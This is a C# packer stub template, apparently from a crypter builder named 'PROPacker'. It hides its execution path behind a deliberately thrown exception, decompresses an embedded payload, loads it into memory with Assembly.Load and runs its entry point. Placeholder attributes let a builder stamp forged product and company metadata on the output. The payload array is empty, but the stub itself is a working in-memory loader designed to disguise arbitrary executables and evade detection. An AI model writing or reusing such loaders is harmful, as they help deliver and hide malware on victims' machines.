using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

#if UseAssembly
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace PROPacker
{
    internal class PROXL05D
    {
        static void Main(string[] args)
        {
            try
            {
                Assembly.Load(new byte[0]);
            }
            catch
            {
                byte[] decompressedBytes = Decompress(BridgeConf.HexPayload);
                BridgeRuntime.Execute(decompressedBytes);
            }
        }

        public static byte[] Decompress(byte[] compressedData)
        {
            using (var compressedStream = new MemoryStream(compressedData))
            using (var decompressionStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
            using (var decompressedStream = new MemoryStream())
            {
                decompressionStream.CopyTo(decompressedStream);
                return decompressedStream.ToArray();
            }
        }
    }

    internal class BridgeRuntime
    {
        public static void Execute(byte[] decompressedBytes)
        {
            Assembly assembly = Assembly.Load(decompressedBytes);
            MethodInfo entryPoint = assembly.EntryPoint;
            if (entryPoint != null)
            {
                object[] parameters = entryPoint.GetParameters().Length == 0 ? null : new object[] { new string[] { } };
                entryPoint.Invoke(null, parameters);
            }
        }
    }

    internal class BridgeConf
    {
        public static byte[] HexPayload = new byte[] { };
    }
}